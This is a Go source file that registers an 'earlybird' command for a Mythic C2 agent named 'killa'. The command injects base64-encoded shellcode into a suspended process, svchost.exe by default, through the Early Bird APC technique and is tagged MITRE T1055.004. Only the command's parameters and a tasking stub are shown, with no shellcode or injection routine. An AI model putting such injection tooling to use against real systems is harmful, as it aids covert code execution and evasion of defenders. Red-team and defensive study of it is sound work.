package agentfunctions

import (
	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
)

func init() {
	agentstructs.AllPayloadData.Get("killa").AddCommand(agentstructs.Command{
		Name:                "earlybird",
		Description:         "Inject shellcode via Early Bird technique (CREATE_SUSPENDED -> APC -> ResumeThread)",
		HelpString:          "earlybird -process_name \"C:\\Windows\\System32\\svchost.exe\" -shellcode_b64 \"...\"",
		Version:             1,
		Author:              "@m",
		MitreAttackMappings: []string{"T1055.004"}, // Process Injection: Asynchronous Procedure Call
		SupportedUIFeatures: []string{},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:          "shellcode_b64",
				Description:   "Base64 encoded shellcode bytes to inject",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:  "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						UIModalPosition:       1,
						GroupName:             "Default",
					},
				},
			},
			{
				Name:          "process_name",
				Description:   "Process to spawn in a suspended state",
				DefaultValue:  "C:\\Windows\\System32\\svchost.exe",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:       2,
						GroupName:             "Default",
					},
				},
			},
		},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			return response
		},
	})
}
